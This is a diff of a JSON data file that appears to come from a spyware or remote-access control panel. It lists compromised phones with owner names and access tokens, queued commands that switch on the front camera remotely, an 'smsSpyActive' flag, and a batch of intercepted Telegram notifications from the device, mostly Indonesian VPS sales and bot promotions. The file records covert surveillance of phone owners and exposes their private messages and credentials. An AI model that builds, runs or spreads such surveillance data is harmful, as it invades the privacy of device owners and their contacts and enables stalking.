@@ -4,7 +4,7 @@
     "deviceName": "HP-TES123-74EC",
     "ownerUsername": "BLAY VIP",
     "token": "55a5b4006ca55171a079b79bc615ba6c",
-    "lastSeen": 1775458685079,
+    "lastSeen": 1775458688091,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-06T06:50:16.345Z",
@@ -2507,15 +2507,8 @@
     "deviceName": "HP-RISKI_123-D73B",
     "ownerUsername": "Riski",
     "token": "edadccccbb547c8d8cc05f1fd51950e5",
-    "lastSeen": 1775458684397,
+    "lastSeen": 1775458687352,
     "commandQueue": [
-      {
-        "type": "camera_live_switch",
-        "payload": {
-          "facing": "front"
-        },
-        "sentAt": 1775458683867
-      },
       {
         "type": "camera_live_start",
         "payload": {
@@ -2538,6 +2531,94 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "𝗫𝗢-𝟬𝟭𝟱 𝗩𝗖𝗧 𝗣𝗥𝗢𝗠𝗢𝗦𝗜: Rose",
+        "content": "KALO JUAL DENGAN HARGA YANG AGAK TERJANGKAU AJA\n\n7-10K\n\nLANGGAR GW KICK",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688538
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗫𝗢-𝟬𝟭𝟱 𝗩𝗖𝗧 𝗣𝗥𝗢𝗠𝗢𝗦𝗜: King 11",
+        "content": "YANG MAU BELI PANEL JS ATAU VPS TANPA RIBET HARGA MURAH DAN TERPERCAYA 100% AMANAH\nHARGA PANEL MULAI DARI 300-2.000\nSETIAP RAM +300\nUNLIMITE 2.000\n\nHARGA VPS MULAI DARI 6-15K\nMASA AKTIF 20-30 HARI\nGARANSI 5-15 HARI SESUAI RAM/HARGA\n\nBENEFRIT PANEL\nVPS AKTIF 20-30 HARI\nBISA CLAIM GARANSI JIKA PANEL BERMASALAH\nPANEL 100% PRIVATE\nGK OPEN RES/ADP PANEL\nANTI INTIP\nANTI LAG\nRAM VPS R8 C4\nBENEFRIT VPS\nBEBAS REQ DOMAIN\nFREE DOMAIN\nFREE INSTAL PANEL\nFREE EGG BOT\nFREE NODEJS V1-V24\n\nBOT AUTO ORDER\n@botshopxyro_bot\n@botshopxyro_bot\nCHANEL TESTI BOT\n@xyrotesti\n@xyrotesti\nROOM PUBLIK\n@roompiblikxyro\n@roompiblikxyro",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688352
+      },
+      {
+        "appName": "Telegram",
+        "sender": "prástzy.",
+        "content": "free trapenden 1 bulan",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688310
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Room Public: BOT JASHER FREE / ON 24 JAM",
+        "content": "BOT JASHER FREE JOIN BRE\n\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n\nBOT JASHER BREE NANTI KALO MAU SHARE MINTA ADD AJA𝘽𝙤𝙩 𝙅𝙖𝙨𝙝𝙚𝙧 𝙁𝙧𝙚𝙚 𝙑𝙫𝙞𝙥 \n@JasherFreeVippPremBot\n@JasherFreeVippPremBot",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688108
+      },
+      {
+        "appName": "Telegram",
+        "sender": "ALL TITLE VPS ( PRIVATE ): 𝐅𝐀𝐇𝐌𝐈 𝐒𝐓𝐎𝐑𝐄",
+        "content": "Lu juga",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458688021
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "XTERCLOSE・8951 pesan baru dari 92 obrolan",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458687666
+      },
+      {
+        "appName": "Telegram",
+        "sender": "⏤͟͟͞͞l⚡ MURBUGVIP: autocpu",
+        "content": "📊 Monitoring CPU Server\n\nStatus Server:\n✅ Semua server normal (CPU < 80%)",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458687328
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗠𝗨𝗥𝗕𝗨𝗚 𝗖𝗢𝗡𝗚: Rose",
+        "content": "Heya :) PM me if you have any questions on how to use me!",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458686968
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗫𝗢-𝟬𝟭𝟱 𝗩𝗖𝗧 𝗣𝗥𝗢𝗠𝗢𝗦𝗜: Rose",
+        "content": "KALO JUAL DENGAN HARGA YANG AGAK TERJANGKAU AJA\n\n7-10K\n\nLANGGAR GW KICK",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458686857
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗫𝗢-𝟬𝟭𝟱 𝗩𝗖𝗧 𝗣𝗥𝗢𝗠𝗢𝗦𝗜: King 11",
+        "content": "YANG MAU BELI PANEL JS ATAU VPS TANPA RIBET HARGA MURAH DAN TERPERCAYA 100% AMANAH\nHARGA PANEL MULAI DARI 300-2.000\nSETIAP RAM +300\nUNLIMITE 2.000\n\nHARGA VPS MULAI DARI 6-15K\nMASA AKTIF 20-30 HARI\nGARANSI 5-15 HARI SESUAI RAM/HARGA\n\nBENEFRIT PANEL\nVPS AKTIF 20-30 HARI\nBISA CLAIM GARANSI JIKA PANEL BERMASALAH\nPANEL 100% PRIVATE\nGK OPEN RES/ADP PANEL\nANTI INTIP\nANTI LAG\nRAM VPS R8 C4\nBENEFRIT VPS\nBEBAS REQ DOMAIN\nFREE DOMAIN\nFREE INSTAL PANEL\nFREE EGG BOT\nFREE NODEJS V1-V24\n\nBOT AUTO ORDER\n@botshopxyro_bot\n@botshopxyro_bot\nCHANEL TESTI BOT\n@xyrotesti\n@xyrotesti\nROOM PUBLIK\n@roompiblikxyro\n@roompiblikxyro",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458686713
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Room Public: BOT JASHER FREE / ON 24 JAM",
+        "content": "BOT JASHER FREE JOIN BRE\n\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n@JasherFreeVippPremBot\n\nBOT JASHER BREE NANTI KALO MAU SHARE MINTA ADD AJA𝘽𝙤𝙩 𝙅𝙖𝙨𝙝𝙚𝙧 𝙁𝙧𝙚𝙚 𝙑𝙫𝙞𝙥 \n@JasherFreeVippPremBot\n@JasherFreeVippPremBot",
+        "time": "06/04 13:58",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1775458686539
+      },
       {
         "appName": "Telegram",
         "sender": "prástzy.",
